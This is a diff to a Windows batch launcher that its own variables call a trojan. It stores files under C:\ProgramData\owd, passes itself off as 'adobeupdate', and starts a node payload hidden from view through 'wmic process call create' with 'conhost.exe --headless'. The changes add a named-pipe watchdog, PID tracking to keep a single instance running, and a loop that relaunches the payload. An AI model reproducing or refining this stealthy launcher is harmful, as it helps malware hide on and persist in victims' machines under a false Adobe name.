@@ -1,10 +1,6 @@
-set "LOCKFILE=%~dp0_script.lock"
+REM ! at tpl yonge/bloor task will not run if script is still running -- pid check is not necessary
 
-:: Try to create or open the lock file for writing
-(call ) 9>"%LOCKFILE%" || (
-    echo Another instance is already running. Exiting.
-    goto :eof
-)
+echo %random% > tpl_%random%
 
 SET script_version=launcher_for_adobeupdate
 
@@ -13,6 +9,8 @@ SET "trojandir=C:\ProgramData\owd"
 cd /d %trojandir%
 
 set trojanfname=adobeupdate
+
+title tpl_launch_%trojanfname%
 
 set clientid=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
 
@@ -103,7 +101,36 @@ type nul > %logfpath%
 
 echo starting [ %source% ] [ %* ]  %clientid% ] [ %timestamp% ] >> %logfpath%
 
-REM check cmd line args -- if present, execute nodejs script directly
+set "pipeName=\\.\pipe\owd_watchdog_lock"
+
+powershell -Command "if (Test-Path '%pipeName%') { exit 0 } else { exit 222 }"
+
+if %errorlevel% equ 0 (
+    echo [INFO] Named pipe "%pipeName%" exists -- exiting >> %logfpath%
+    exit
+) else (
+    echo [INFO] Named pipe "%pipeName%" does not exist. -- continuing >> %logfpath%
+)
+
+SET tscriptPID=
+SET scriptPID=
+
+IF EXIST %trojandir%\%source%_running (
+    SET /p tscriptPID=<%trojandir%\%source%_running
+)
+
+tasklist /fi "PID eq %scriptPID%"
+
+IF "%errorlevel%"=="0" (
+    echo loop is running -- exiting >> %logfpath%
+    exit
+)
+
+for /f "tokens=2 delims==" %%A in ('wmic process where "name='wmic.exe' and commandline like '%%%%_%%random%%_%%%%'" get parentprocessid /value') do set "scriptPID=%%A"
+
+echo script pid: %scriptPID% >> %logfpath%
+
+echo %scriptPID% > %trojandir%\%source%_running
 
 set cmdname=ping
 
@@ -114,6 +141,7 @@ exit 1
 
 
 :pingloop
+    
     
     IF EXIST %trojandir%\killall (
         echo exiting pingloop >> %logfpath%
@@ -143,11 +171,8 @@ exit 1
     
     type %trojandir%\%pingfname% | findstr /I start_node
 
-    %nodepath% --version >> %logfpath%
-
     IF "%errorlevel%"=="0" (
         echo  starting node launch_ping >> %logfpath%
-        REM start "" /min conhost.exe --headless %nodepath% %trojandir%\%trojanfname% launch_ping %*
         wmic process call create "conhost.exe --headless %nodepath% %trojandir%\%trojanfname% launch_ping %*"
     )
 
